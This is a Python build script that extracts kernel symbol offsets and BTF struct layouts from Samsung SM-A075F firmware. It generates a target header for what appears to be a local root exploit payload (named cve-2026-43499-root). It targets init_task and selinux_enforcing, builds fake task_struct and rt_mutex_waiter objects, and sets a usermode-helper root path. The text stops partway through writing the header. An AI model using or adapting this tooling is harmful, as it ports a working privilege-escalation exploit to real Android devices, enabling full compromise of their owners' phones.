#!/usr/bin/env python3
"""Audit the SM-A075F firmware and emit a target header only from verified inputs.

The workflow downloads the source/release assets; this script keeps those inputs local to the
runner, extracts Kernel/Kernel.tar.gz from Samsung's opensource zip, and writes only a sanitized
summary. It deliberately does not copy SM-A175F values or fall back to common.h defaults for the
A07's unverified physical layout, skb geometry, pselect shift, or tracefs offsets.

The optional profile JSON is an evidence-bearing map of values that cannot be derived from the
provided ELF/BTF/source alone. Every required value must have a non-empty evidence string. If any
symbol, BTF layout, source cross-check, or profile value is missing, no production target.h is
written and the report names the exact missing item plus the closest symbol names found.
"""

from __future__ import annotations

import argparse
import difflib
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import zipfile
from pathlib import Path
from typing import Any

MODEL = "SM-A075F"
KERNEL_VERSION = "6.12.38"

# Kernel symbols that the current payload source consumes as target-specific offsets.
SYMBOL_MACROS: dict[str, tuple[str, ...]] = {
    "INIT_TASK_OFF": ("init_task",),
    "ROOT_TASK_GROUP_OFF": ("root_task_group",),
    "SELINUX_ENFORCING_OFF": ("selinux_enforcing",),
    "KMALLOC_CACHES_OFF": ("kmalloc_caches",),
    "ANON_PIPE_BUF_OPS_OFF": ("anon_pipe_buf_ops",),
    "ASHMEM_MISC_FOPS_OFF": ("ashmem_misc_fops", "ashmem_fops_misc"),
    "ASHMEM_FOPS_OFF": ("ashmem_fops",),
    "ASHMEM_IOCTL_OFF": ("ashmem_ioctl",),
    "ASHMEM_COMPAT_IOCTL_OFF": ("ashmem_compat_ioctl",),
    "ASHMEM_MMAP_OFF": ("ashmem_mmap",),
    "ASHMEM_OPEN_OFF": ("ashmem_open",),
    "ASHMEM_RELEASE_OFF": ("ashmem_release",),
    "ASHMEM_SHOW_FDINFO_OFF": ("ashmem_show_fdinfo",),
    "CONFIGFS_READ_ITER_OFF": ("configfs_read_iter", "configfs_read_file_iter"),
    "CONFIGFS_BIN_WRITE_ITER_OFF": (
        "configfs_bin_write_iter",
        "configfs_bin_file_write_iter",
    ),
    "COPY_SPLICE_READ_OFF": ("copy_splice_read",),
    "NOOP_LLSEEK_OFF": ("noop_llseek",),
    "CALL_USERMODEHELPER_EXEC_WORK_OFF": ("call_usermodehelper_exec_work",),
    "SYSTEM_UNBOUND_WQ_OFF": ("system_unbound_wq",),
}

# These were explicitly requested for symbol/source investigation. They are reported even if they
# are not needed by the current target header, but their absence alone does not block the profile.
DIAGNOSTIC_SYMBOLS: dict[str, tuple[str, ...]] = {
    "file_open_name": ("file_open_name",),
    "do_filp_open": ("do_filp_open",),
    "kernfs_fop_write_iter": ("kernfs_fop_write_iter",),
    "userfaultfd_fops": ("userfaultfd_fops",),
    "fasync_helper": ("fasync_helper",),
    "vfs_iter_write": ("vfs_iter_write",),
}

# Values that cannot safely be copied from the A17 reference or inferred from a symbol table.
# Keep this list explicit: the report and profile template are the porting checklist.
PROFILE_REQUIRED_MACROS = (
    "P0_PAGE_OFFSET",
    "P0_PHYS_OFFSET",
    "P0_KERNEL_PHYS_LOAD",
    "DIRECT_MAP_BASE",
    "DIRECT_MAP_END",
    "VMEMMAP_START",
    "SKB_DATA_DELTA",
    "SLIDE_PSELECT_WORD_SHIFT",
    "SLIDE_TRACEFS_EVENT_ID",
    "SLIDE_TRACEFS_WORKER_CALLER_OFF",
    "SLIDE_NFULNL_LOGGER_NAME_OFF",
    "SLIDE_NFULNL_LOGGER_OBJECT_OFF",
    "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF",
    "SLIDE_SYSCTL_BOOTID_OFF",
    "KMALLOC_CACHE_TYPES",
    "KMALLOC_CGROUP_TYPE",
    "SLIDE_FAKE_WAITER_PRIO",
    "SLIDE_WAITER_WAKE_STATE",
    "LEGACY_RT_MUTEX_WAITER",
    "COMPACT_RT_MUTEX_WAITER",
    "SLIDE_LOCK_OWNER_VALUE",
    "SLIDE_USE_FAKE_TASK",
    "SLIDE_RB_PARENT_TYPE_RESTORE",
    "SLIDE_P0_OFFSET_CANDIDATES",
)

# BTF types/fields consumed by the existing payload. Offsets are taken from A07's own vmlinux.btf,
# not from any target.h checked into the repository.
BTF_FIELD_MACROS: dict[str, tuple[str, str]] = {
    "TASK_STRUCT_MM_OFF": ("task_struct", "mm"),
    "FAKE_TASK_USAGE_OFF": ("task_struct", "usage"),
    "FAKE_TASK_PRIO_OFF": ("task_struct", "prio"),
    "FAKE_TASK_NORMAL_PRIO_OFF": ("task_struct", "normal_prio"),
    "FAKE_TASK_TASK_GROUP_OFF": ("task_struct", "sched_task_group"),
    "FAKE_TASK_PI_LOCK_OFF": ("task_struct", "pi_lock"),
    "FAKE_TASK_PI_WAITERS_OFF": ("task_struct", "pi_waiters"),
    "FAKE_TASK_PI_TOP_TASK_OFF": ("task_struct", "pi_top_task"),
    "FAKE_TASK_PI_BLOCKED_ON_OFF": ("task_struct", "pi_blocked_on"),
    "FAKE_WAITER_TREE_PRIO_OFF": ("rt_mutex_waiter", "prio"),
    "FAKE_WAITER_TREE_DEADLINE_OFF": ("rt_mutex_waiter", "deadline"),
    "FAKE_WAITER_PI_TREE_ENTRY_OFF": ("rt_mutex_waiter", "pi_tree_entry"),
    "FAKE_WAITER_PI_TREE_PRIO_OFF": ("rt_mutex_waiter", "pi_tree_prio"),
    "FAKE_WAITER_PI_TREE_DEADLINE_OFF": ("rt_mutex_waiter", "pi_tree_deadline"),
    "FAKE_WAITER_TASK_OFF": ("rt_mutex_waiter", "task"),
    "FAKE_WAITER_LOCK_OFF": ("rt_mutex_waiter", "lock"),
    "FAKE_WAITER_WAKE_STATE_OFF": ("rt_mutex_waiter", "wake_state"),
    "FAKE_WAITER_WW_CTX_OFF": ("rt_mutex_waiter", "ww_ctx"),
    "FOPS_OWNER_OFF": ("file_operations", "owner"),
    "FOPS_LLSEEK_OFF": ("file_operations", "llseek"),
    "FOPS_READ_OFF": ("file_operations", "read"),
    "FOPS_WRITE_OFF": ("file_operations", "write"),
    "FOPS_READ_ITER_OFF": ("file_operations", "read_iter"),
    "FOPS_WRITE_ITER_OFF": ("file_operations", "write_iter"),
    "FOPS_IOCTL_OFF": ("file_operations", "unlocked_ioctl"),
    "FOPS_COMPAT_IOCTL_OFF": ("file_operations", "compat_ioctl"),
    "FOPS_MMAP_OFF": ("file_operations", "mmap"),
    "FOPS_OPEN_OFF": ("file_operations", "open"),
    "FOPS_RELEASE_OFF": ("file_operations", "release"),
    "FOPS_SPLICE_READ_OFF": ("file_operations", "splice_read"),
    "FOPS_SHOW_FDINFO_OFF": ("file_operations", "show_fdinfo"),
    "STRUCT_PAGE_COMPOUND_HEAD_OFF": ("page", "compound_head"),
    "STRUCT_SLAB_CACHE_OFF": ("page", "slab_cache"),
    "STRUCT_PAGE_TYPE_OFF": ("page", "page_type"),
    "WORK_DATA_OFF": ("work_struct", "data"),
    "WORK_ENTRY_OFF": ("work_struct", "entry"),
    "WORK_FUNC_OFF": ("work_struct", "func"),
    "PWQ_POOL_OFF": ("pool_workqueue", "pool"),
    "PWQ_WQ_OFF": ("pool_workqueue", "wq"),
    "PWQ_WORK_COLOR_OFF": ("pool_workqueue", "work_color"),
    "PWQ_REFCNT_OFF": ("pool_workqueue", "refcnt"),
    "PWQ_NR_IN_FLIGHT_OFF": ("pool_workqueue", "nr_in_flight"),
    "PWQ_NR_ACTIVE_OFF": ("pool_workqueue", "nr_active"),
    "PWQ_MAX_ACTIVE_OFF": ("pool_workqueue", "max_active"),
    "POOL_WORKLIST_OFF": ("worker_pool", "worklist"),
    "POOL_NR_IDLE_OFF": ("worker_pool", "nr_idle"),
    "WQ_DFL_PWQ_OFF": ("workqueue_struct", "dfl_pwq"),
    "CFG_PAGE_OFF": ("configfs_buffer", "page"),
    "CFG_NEEDS_READ_FILL_OFF": ("configfs_buffer", "needs_read_fill"),
    "CFG_BIN_BUFFER_OFF": ("configfs_buffer", "bin_buffer"),
    "CFG_BIN_BUFFER_SIZE_OFF": ("configfs_buffer", "bin_buffer_size"),
    "CFG_CB_MAX_SIZE_OFF": ("configfs_buffer", "cb_max_size"),
}

BTF_SIZE_MACROS = {
    "MM_STRUCT_SZ": "mm_struct",
    "SIZEOF_FILE_OPERATIONS": "file_operations",
    "SIZEOF_PAGE": "page",
    "STRUCT_PAGE_SIZE": "page",
    "FAKE_WAITER_LAYOUT_SIZE": "rt_mutex_waiter",
}

# Required exact ELF symbols. Aliases are deliberately narrow; fuzzy matches are reported, never
# substituted into a production header.
CORE_SYMBOLS = ("init_task", "root_task_group", "kmalloc_caches", "anon_pipe_buf_ops")


def run(command: list[str], *, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, check=check, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def asset_file(root: Path, name: str, *, required: bool = True) -> Path | None:
    matches = sorted(path for path in root.rglob(name) if path.is_file())
    if len(matches) == 1:
        return matches[0]
    if not matches and not required:
        return None
    if not matches:
        raise FileNotFoundError(f"required release asset not found: {name}")
    raise RuntimeError(f"release asset name is ambiguous ({name}): " + ", ".join(map(str, matches)))


def extract_kernel_source(source_zip: Path, out_dir: Path) -> tuple[Path, str]:
    out_dir.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(source_zip) as archive:
        names = archive.namelist()
        # Samsung source packages vary in whether Kernel.tar.gz sits at the root or
        # below a Kernel/ directory. Require a unique exact filename, not a fuzzy match.
        entries = [name for name in names if Path(name).name == "Kernel.tar.gz"]
        if len(entries) != 1:
            candidates = [name for name in names if "kernel" in name.lower() or name.endswith((".tar.gz", ".tar.xz", ".zip"))]
            raise RuntimeError(
                "expected exactly one Kernel.tar.gz within the Samsung opensource zip; "
                f"found {len(entries)}. Candidate archive members (up to 20): "
                + ", ".join(candidates[:20])
            )
        tar_path = out_dir / "Kernel.tar.gz"
        with archive.open(entries[0]) as src, tar_path.open("wb") as dst:
            shutil.copyfileobj(src, dst)

    unpacked = out_dir / "kernel-source"
    unpacked.mkdir(parents=True, exist_ok=True)
    with tarfile.open(tar_path, "r:gz") as archive:
        # Python's data filter rejects absolute paths and ../ traversal while retaining source files.
        archive.extractall(unpacked, filter="data")
    headers = sorted(unpacked.rglob("include/linux/sched.h"))
    if len(headers) != 1:
        raise RuntimeError(
            "Kernel.tar.gz must contain exactly one include/linux/sched.h; "
            f"found {len(headers)}"
        )
    return headers[0].parents[2], entries[0]


def parse_nm(path: Path) -> dict[str, int]:
    result = run(["nm", "-n", "--defined-only", str(path)], check=False)
    if result.returncode != 0 and not result.stdout.strip():
        raise RuntimeError(f"nm failed for {path}: {result.stderr.strip()}")
    symbols: dict[str, int] = {}
    for line in result.stdout.splitlines():
        match = re.match(r"^\s*([0-9a-fA-F]+)\s+\S\s+(\S+)\s*$", line)
        if match:
            symbols[match.group(2)] = int(match.group(1), 16)
    return symbols


def parse_readelf_symbols(path: Path) -> dict[str, int]:
    result = run(["readelf", "-Ws", str(path)], check=False)
    if result.returncode != 0:
        raise RuntimeError(f"readelf -Ws failed for {path}: {result.stderr.strip()}")
    symbols: dict[str, int] = {}
    for line in result.stdout.splitlines():
        # Num: Value Size Type Bind Vis Ndx Name
        match = re.match(
            r"^\s*\d+:\s+([0-9a-fA-F]+)\s+\d+\s+\S+\s+\S+\s+\S+\s+(\S+)\s+(\S+)",
            line,
        )
        if match and match.group(2) not in ("UND", "ABS"):
            name = match.group(3).split("@", 1)[0]
            value = int(match.group(1), 16)
            if value:
                symbols[name] = value
    return symbols


def parse_kallsyms(path: Path) -> set[str]:
    names: set[str] = set()
    for line in path.read_text(errors="replace").splitlines():
        match = re.match(r"^\s*[0-9a-fA-F]+\s+[A-Za-z?]\s+(\S+)", line)
        if match:
            names.add(match.group(1).split("@", 1)[0])
    return names


def closest_names(name: str, names: set[str] | list[str], limit: int = 5) -> list[str]:
    return difflib.get_close_matches(name, sorted(names), n=limit, cutoff=0.42)


def section_text_base(path: Path, nm_symbols: dict[str, int]) -> int | None:
    sections = run(["readelf", "-W", "-S", str(path)], check=False)
    for line in sections.stdout.splitlines():
        match = re.search(r"\]\s+\.text\s+\S+\s+([0-9a-fA-F]+)", line)
        if match:
            return int(match.group(1), 16)
    for candidate in ("_text", "__text", "_stext", "stext"):
        if candidate in nm_symbols:
            return nm_symbols[candidate]
    return None


def elf_probe(path: Path) -> tuple[bool, list[str], dict[str, int], dict[str, int], int | None]:
    problems: list[str] = []
    header = run(["readelf", "-h", str(path)], check=False)
    if header.returncode != 0:
        return False, [f"readelf cannot parse ELF: {header.stderr.strip()}"], {}, {}, None
    if "AArch64" not in header.stdout:
        problems.append("ELF machine is not AArch64")
    sections = run(["readelf", "-W", "-S", str(path)], check=False)
    if sections.returncode != 0 or ".symtab" not in sections.stdout:
        problems.append("ELF has no readable .symtab section")
    try:
        nm_symbols = parse_nm(path)
        readelf_symbols = parse_readelf_symbols(path)
    except RuntimeError as error:
        problems.append(str(error))
        nm_symbols, readelf_symbols = {}, {}
    if len(nm_symbols) < 100:
        problems.append(f"nm found only {len(nm_symbols)} defined symbols; ELF is likely incomplete")
    missing_core = [symbol for symbol in CORE_SYMBOLS if symbol not in nm_symbols and symbol not in readelf_symbols]
    if missing_core:
        problems.append("missing core symbols: " + ", ".join(missing_core))
    missing_target = [
        aliases[0]
        for aliases in SYMBOL_MACROS.values()
        if not any(symbol in nm_symbols or symbol in readelf_symbols for symbol in aliases)
    ]
    if missing_target:
        problems.append("missing target-header symbols: " + ", ".join(missing_target))
    base = section_text_base(path, nm_symbols)
    if base is None:
        problems.append("could not identify the kernel .text virtual base")
    return not problems, problems, nm_symbols, readelf_symbols, base


def find_linux_release(path: Path) -> str | None:
    proc = subprocess.Popen(
        ["strings", "-a", "-n", "8", str(path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        errors="replace",
    )
    assert proc.stdout is not None
    release = None
    for line in proc.stdout:
        match = re.search(r"Linux version\s+([^\s]+)", line)
        if match:
            release = match.group(1)
            break
    if proc.poll() is None:
        proc.terminate()
    proc.wait(timeout=30)
    return release


def strip_c_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", lambda m: "\n" * m.group(0).count("\n"), text, flags=re.S)
    return re.sub(r"//[^\n]*", "", text)


def task_struct_source_mm(header: Path) -> tuple[bool, int | None, str | None]:
    original = header.read_text(errors="replace")
    clean = strip_c_comments(original)
    start = re.search(r"\bstruct\s+task_struct\s*\{", clean)
    if not start:
        return False, None, None
    open_brace = clean.find("{", start.start())
    depth = 0
    end = None
    for index in range(open_brace, len(clean)):
        if clean[index] == "{":
            depth += 1
        elif clean[index] == "}":
            depth -= 1
            if depth == 0:
                end = index
                break
    if end is None:
        return False, None, None
    body = clean[open_brace + 1:end]
    field = re.search(r"\bstruct\s+mm_struct\s*\*\s*mm\s*;", body)
    if not field:
        return False, None, None
    line_number = clean[:open_brace + 1 + field.start()].count("\n") + 1
    source_lines = original.splitlines()
    context = source_lines[line_number - 1].strip() if line_number <= len(source_lines) else "struct mm_struct *mm;"
    return True, line_number, context


def make_btf_elf(btf_file: Path, out_elf: Path) -> None:
    # A tiny ELF with no DWARF guarantees pahole reads the supplied .BTF section, rather than
    # selecting unrelated debug information from a vmlinux wrapper. The raw BTF carries the target
    # types and is attached verbatim; the wrapper's host architecture is not used for layouts.
    source = out_elf.with_suffix(".c")
    source.write_text("int a07_btf_wrapper;\n")
    compiled = run(["cc", "-g0", "-c", str(source), "-o", str(out_elf)], check=False)
    if compiled.returncode != 0:
        raise RuntimeError("could not create a temporary ELF wrapper for BTF: " + compiled.stderr.strip())
    objcopy = shutil.which("llvm-objcopy") or shutil.which("objcopy")
    if not objcopy:
        raise RuntimeError("llvm-objcopy/objcopy is required to attach vmlinux.btf for pahole")
    result = run(
        [
            objcopy,
            f"--add-section=.BTF={btf_file}",
            "--set-section-flags=.BTF=alloc,readonly,data,contents",
            str(out_elf),
            str(out_elf) + ".new",
        ],
        check=False,
    )
    if result.returncode != 0:
        raise RuntimeError("could not attach vmlinux.btf to a temporary ELF: " + result.stderr.strip())
    Path(str(out_elf) + ".new").replace(out_elf)


def parse_integer(text: str) -> int:
    text = text.strip().rstrip(",")
    return int(text, 16) if text.lower().startswith("0x") else int(text, 10)


# pahole prints function-pointer members as `loff_t (*llseek)(struct file *, loff_t, int);`.
# Taking the last identifier of that line yields the parameter type (`int`), not the member, so
# every `file_operations` callback used to be recorded under a type keyword and then reported as
# missing. The member name is inside the `(*name)` group; bitfields carry a `:width` suffix.
FUNC_PTR_MEMBER = re.compile(r"\(\s*\*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)")
BITFIELD_MEMBER = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)\s*:\s*\d+\s*$")
TRAILING_MEMBER = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)\s*$")
TYPE_KEYWORDS = frozenset(
    """int long short char unsigned signed void struct union enum float double bool const
    volatile restrict u8 u16 u32 u64 s8 s16 s32 s64 __u8 __u16 __u32 __u64 size_t ssize_t
    loff_t off_t atomic_t refcount_t spinlock_t""".split()
)


STRUCT_BASE = re.compile(r"\b(?:struct|union|enum)\s+([A-Za-z_][A-Za-z0-9_]*)")


def member_declaration(declaration: str) -> tuple[str | None, str | None, bool]:
    """The member a pahole line declares, the struct/union type it embeds, and whether it is a pointer.

    The embedded type is what makes a nested member path (`rt_mutex_waiter.tree.prio`) walkable
    from A07's own BTF instead of being assumed from another kernel's layout.
    """
    text = declaration.strip().rstrip(";").strip()
    text = re.sub(r"\[[^\]]*\]\s*$", "", text).strip()
    if not text or text in {"}", "};", "{", "union", "struct"}:
        return None, None, False
    bitfield = BITFIELD_MEMBER.search(text)
    func_ptr = FUNC_PTR_MEMBER.search(text)
    if bitfield:
        name, type_text = bitfield.group(1), text[: bitfield.start()]
    elif func_ptr:
        name, type_text = func_ptr.group(1), text[: func_ptr.start()]
    else:
        trailing = TRAILING_MEMBER.search(text)
        if not trailing or trailing.group(1) in TYPE_KEYWORDS:
            return None, None, False
        name, type_text = trailing.group(1), text[: trailing.start()]
    base = STRUCT_BASE.search(type_text)
    return name, (base.group(1) if base else None), ("*" in type_text)


def member_name(declaration: str) -> str | None:
    """The C member a pahole declaration line describes, or None when it is not a member."""
    return member_declaration(declaration)[0]


def pahole_type(
    path: Path, type_name: str
) -> tuple[dict[str, int], dict[str, tuple[str, bool]], int | None, str]:
    """Member offsets, the struct/union each member embeds, the type size, and pahole's raw text."""
    result = run(["pahole", "--hex", "-C", type_name, str(path)], check=False)
    output = result.stdout
    if result.returncode != 0 or not output.strip():
        return {}, {}, None, result.stderr.strip() or output.strip() or f"pahole could not find {type_name}"
    fields: dict[str, int] = {}
    types: dict[str, tuple[str, bool]] = {}
    size = None
    size_match = re.search(r"/\*\s*size:\s*(0x[0-9a-fA-F]+|\d+)", output)
    if size_match:
        size = parse_integer(size_match.group(1))
    for line in output.splitlines():
        comment = re.search(r"/\*\s*(0x[0-9a-fA-F]+|\d+)\s+(?:0x[0-9a-fA-F]+|\d+)", line)
        if not comment:
            continue
        name, base, pointer = member_declaration(line.split("/*", 1)[0])
        if name:
            fields[name] = parse_integer(comment.group(1))
            if base:
                types[name] = (base, pointer)
    return fields, types, size, output


# Macros whose value moved inside a nested struct (or into a companion struct that embeds the
# original one) in this kernel generation. Each entry is `(root type, dotted member path, optional
# cross-check)`. A path is walked through A07's own BTF; anything absent is reported, never assumed.
DERIVED_BTF_PATHS: dict[str, tuple[str, str, tuple[str, int] | None, str | None]] = {
    "FAKE_WAITER_TREE_PRIO_OFF": ("rt_mutex_waiter", "tree.prio", None, None),
    "FAKE_WAITER_TREE_DEADLINE_OFF": ("rt_mutex_waiter", "tree.deadline", None, None),
    # The payload writes this as an rb_node (parent/right/left at +0/+8/+0x10), so the leaf member
    # has to *be* an embedded rb_node. The name comes from A07's BTF; the type is asserted, not
    # assumed from the older flat `pi_tree_entry` member.
    "FAKE_WAITER_PI_TREE_ENTRY_OFF": ("rt_mutex_waiter", "pi_tree.entry", None, "rb_node"),
    "FAKE_WAITER_PI_TREE_PRIO_OFF": ("rt_mutex_waiter", "pi_tree.prio", None, None),
    "FAKE_WAITER_PI_TREE_DEADLINE_OFF": ("rt_mutex_waiter", "pi_tree.deadline", None, None),
    # `struct slab` embeds `struct page __page` first, so a member offset inside it is also an
    # offset from the page address the payload already holds. That zero offset is asserted here.
    "STRUCT_SLAB_CACHE_OFF": ("slab", "slab_cache", ("__page", 0), None),
}

# Macros whose member genuinely moved off the struct the payload addresses in this kernel
# generation. There is no fixed offset to substitute, so these are reported as source ports
# rather than derived: `src/root.c` reads `pwq + PWQ_MAX_ACTIVE_OFF`, and on A07's 6.12.38 the
# limit lives on the workqueue the pwq points at, not at any pwq-relative offset.
MOVED_BTF_MACROS: dict[str, tuple[str, str, str, str]] = {
    "PWQ_MAX_ACTIVE_OFF": (
        "pool_workqueue", "max_active", "workqueue_struct",
        "src/root.c:355 reads `pwq + PWQ_MAX_ACTIVE_OFF`; on this kernel max_active is a "
        "workqueue_struct member reached through pwq->wq, so the payload needs a source port, "
        "not a header value",
    ),
}

# Two adjacent members of the same embedded type have to be exactly that type's size apart. This is
# the independent check that a nested walk read the real layout rather than a plausible-looking one.
DERIVED_SPACING_CHECKS: tuple[tuple[str, str, str], ...] = (("rt_mutex_waiter", "tree", "pi_tree"),)


def resolve_btf_path(
    btf_fields: dict[str, dict[str, int]],
    btf_types: dict[str, dict[str, tuple[str, bool]]],
    btf_sizes: dict[str, int],
    ensure,
    root: str,
    path: str,
) -> tuple[int | None, str, str]:
    """Walk a dotted member path through measured BTF layouts.

    Returns `(offset, evidence, leaf_container_type)`; the offset is None when any step is absent,
    and the container is the struct the final member actually lives in, so its declared type can be
    asserted by the caller.
    """
    parts = path.split(".")
    current = root
    offset = 0
    trail = [f"struct {root}"]
    for index, part in enumerate(parts):
        ensure(current)
        fields = btf_fields.get(current, {})
        if part not in fields:
            return None, (
                f"struct {current} has no member `{part}` in A07's BTF; parsed members: "
                + (", ".join(sorted(fields)) or "(none)")
            ), current
        offset += fields[part]
        trail.append(f"{part}@0x{fields[part]:x}")
        if index + 1 < len(parts):
            nested = btf_types.get(current, {}).get(part)
            if not nested or nested[1]:
                return None, (
                    f"struct {current}.{part} is not an embedded struct/union member, "
                    "so it has no nested layout to walk"
                ), current
            current = nested[0]
    total = btf_sizes.get(root)
    if total is not None and offset >= total:
        return None, f"derived offset 0x{offset:x} is outside sizeof(struct {root}) = 0x{total:x}", current
    return offset, " -> ".join(trail), current


def c_literal(value: Any) -> str:
    if isinstance(value, bool):
        return "1" if value else "0"
    if isinstance(value, int):
        suffix = "LL" if value < 0 else "ULL" if value > 0xFFFFFFFF else ""
        return f"{value}{suffix}"
    if isinstance(value, str):
        stripped = value.strip()
        if not stripped or "\n" in stripped or "\r" in stripped or any(x in stripped for x in ("#", ";", "//", "/*", "*/")):
            raise ValueError("profile macro values must be a single safe C literal")
        if stripped.startswith('"') and stripped.endswith('"'):
            return stripped
        number = r"[+-]?(?:0[xX][0-9a-fA-F]+|\d+)(?:ULL|LLU|LL|UL|LU|U|L)?"
        if re.fullmatch(rf"\(?\s*{number}\s*\)?", stripped):
            return stripped
        if re.fullmatch(rf"\s*{number}(?:\s*,\s*{number})+\s*", stripped):
            return stripped
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", stripped):
            return stripped
    raise ValueError(f"unsupported profile macro value: {value!r}")


def profile_values(profile_path: Path | None) -> tuple[dict[str, Any], dict[str, str], list[str]]:
    if profile_path is None or not profile_path.exists():
        return {}, {}, [f"{name} (profile JSON missing)" for name in PROFILE_REQUIRED_MACROS]
    data = json.loads(profile_path.read_text())
    if not isinstance(data, dict):
        raise ValueError("profile JSON must be an object")
    if data.get("model") != MODEL or data.get("kernelVersion") != KERNEL_VERSION:
        raise ValueError("profile model/kernelVersion must be SM-A075F/6.12.38")
    values = data.get("macros", {})
    evidence = data.get("evidence", {})
    if not isinstance(values, dict) or not isinstance(evidence, dict):
        raise ValueError("profile macros and evidence must both be JSON objects")
    missing: list[str] = []
    personal_data_pattern = re.compile(
        r"\b(?:imei|meid|serial(?:\s+number)?|s\s*/\s*n|sn|phone(?:\s+number)?|"
        r"telephone|mobile|msisdn)\b",
        re.I,
    )
    for name in PROFILE_REQUIRED_MACROS:
        if name not in values or values[name] is None:
            missing.append(f"{name} (missing profile value)")
        if not isinstance(evidence.get(name), str) or not evidence[name].strip():
            missing.append(f"{name} (missing evidence string)")
        elif personal_data_pattern.search(evidence[name]):
            missing.append(f"{name} (evidence text contains a prohibited personal-data label)")

    waiter_flags: list[int] = []
    for name in ("LEGACY_RT_MUTEX_WAITER", "COMPACT_RT_MUTEX_WAITER"):
        raw = values.get(name)
        if isinstance(raw, bool):
            flag = int(raw)
        elif isinstance(raw, int):
            flag = raw
        elif isinstance(raw, str):
            numeric = re.sub(r"(?:ULL|LLU|LL|UL|LU|U|L)$", "", raw.strip(), flags=re.I)
            try:
                flag = parse_integer(numeric)
            except ValueError:
                missing.append(f"{name} (must be the numeric literal 0 or 1)")
                continue
        else:
            continue
        if flag not in (0, 1):
            missing.append(f"{name} (must be 0 or 1)")
        else:
            waiter_flags.append(flag)
    if len(waiter_flags) == 2 and sum(waiter_flags) != 1:
        missing.append(
            "select exactly one of LEGACY_RT_MUTEX_WAITER or COMPACT_RT_MUTEX_WAITER"
        )
    return data, evidence, missing


def emit_header(
    output: Path,
    kernel_release: str,
    text_base: int,
    symbol_values: dict[str, int],
    btf_fields: dict[str, dict[str, int]],
    btf_sizes: dict[str, int],
    profile: dict[str, Any],
) -> None:
    macros: dict[str, str] = {
        "TARGET_A07_SM_A075F": "1",
        "TARGET_MODEL": '"SM-A075F"',
        "TARGET_KERNEL_RELEASE": json.dumps(kernel_release),
        "BUILD_VARIANT_LABEL": '"a07-SM-A075F-kernel-6.12.38"',
        "KIMAGE_TEXT_BASE": f"0x{text_base:x}ULL",
    }
    # These constants describe the payload's own in-memory staging buffer, not a target kernel
    # layout. They are shared by this codebase's standard target headers and are kept here rather
    # than imported from another device profile.
    macros.update(
        {
            "LOCK_OFF": "0x2210",
            "W0_OFF": "0x2350",
            "FOPS_OFF": "0x2000",
            "SCRATCH_OFF": "0x3000",
            "RIGHT_OFF": "0x4440",
            "LEFT_OFF": "0x5550",
            "FAKE_TASK_OFF": "0x3200",
            "ROOT_UMH_WORK_OFF": "0x6000",
            "ROOT_UMH_DATA_OFF": "0x6200",
            "ROOT_UMH_PATH": '\"/data/local/tmp/cve-2026-43499-root\"',
            "PIPE_BUF_FLAG_CAN_MERGE": "0x10",
        }
    )
    for macro, aliases in SYMBOL_MACROS.items():
        symbol = next((name for name in aliases if name in symbol_values), None)
        if symbol is None:
            continue
        offset = symbol_values[symbol] - text_base
        if offset < 0:
            continue
        macros[macro] = f"0x{offset:x}ULL"

    for macro, (type_name, member) in BTF_FIELD_MACROS.items():
        if member in btf_fields.get(type_name, {}):
            macros[macro] = f"0x{btf_fields[type_name][member]:x}ULL"
    for macro, type_name in BTF_SIZE_MACROS.items():
        if type_name in btf_sizes:
            macros[macro] = f"0x{btf_sizes[type_name]:x}ULL"

    values = profile.get("macros", {})
    for name, value in values.items():
        if not isinstance(name, str) or not re.fullmatch(r"[A-Z][A-Z0-9_]*", name):
            raise ValueError(f"invalid profile macro name: {name!r}")
        if name in macros:
            raise ValueError(f"profile attempts to override extracted macro {name}")
        macros[name] = c_literal(value)

    # Aliases the C sources consume in addition to the raw offsets.
    for base in (
        "ASHMEM_MISC_FOPS", "ASHMEM_FOPS", "ASHMEM_IOCTL", "ASHMEM_COMPAT_IOCTL",
        "ASHMEM_MMAP", "ASHMEM_OPEN", "ASHMEM_RELEASE", "ASHMEM_SHOW_FDINFO",
        "CONFIGFS_READ_ITER", "CONFIGFS_BIN_WRITE_ITER", "COPY_SPLICE_READ", "NOOP_LLSEEK",
        "INIT_TASK", "ROOT_TASK_GROUP", "SELINUX_ENFORCING", "KMALLOC_CACHES",
        "ANON_PIPE_BUF_OPS", "CALL_USERMODEHELPER_EXEC_WORK", "SYSTEM_UNBOUND_WQ",
    ):
        offset_name = f"{base}_OFF"
        if offset_name in macros:
            macros[base] = f"(KIMAGE_TEXT_BASE + {offset_name})"
    if "ROOT_TASK_GROUP_OFF" in macros:
        macros["SLIDE_ROOT_TASK_GROUP_OFF"] = "ROOT_TASK_GROUP_OFF"
    if "INIT_TASK_OFF" in macros:
        macros["SLIDE_INIT_TASK_OFF"] = "INIT_TASK_OFF"
    if "DIRECT_MAP_BASE" in macros:
        macros["KERNELSNITCH_IDENTITY_START"] = "DIRECT_MAP_BASE"
    if "DIRECT_MAP_END" in macros:
        macros["KERNELSNITCH_IDENTITY_END"] = "DIRECT_MAP_END"
    for macro in (
        "SLIDE_NFULNL_LOGGER_NAME",
        "SLIDE_NFULNL_LOGGER_OBJECT",
        "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR",
        "SLIDE_SYSCTL_BOOTID",
    ):
        offset_name = f"{macro}_OFF"
        if offset_name in macros:
            macros[f"{macro}_IMAGE"] = f"(KIMAGE_TEXT_BASE + {offset_name})"
    if "SLIDE_INIT_TASK_OFF" in macros:
        macros["SLIDE_INIT_TASK_IMAGE"] = "(KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)"
    if "SLIDE_ROOT_TASK_GROUP_OFF" in macros:
        macros["SLIDE_ROOT_TASK_GROUP_IMAGE"] = "(KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)"

    lines = [
        "#ifndef OFFSET_H",
        "#define OFFSET_H",
        "",
        "/* Generated from the SM-A075F kernel 6.12.38 release inputs. Do not hand-edit offsets. */",
    ]
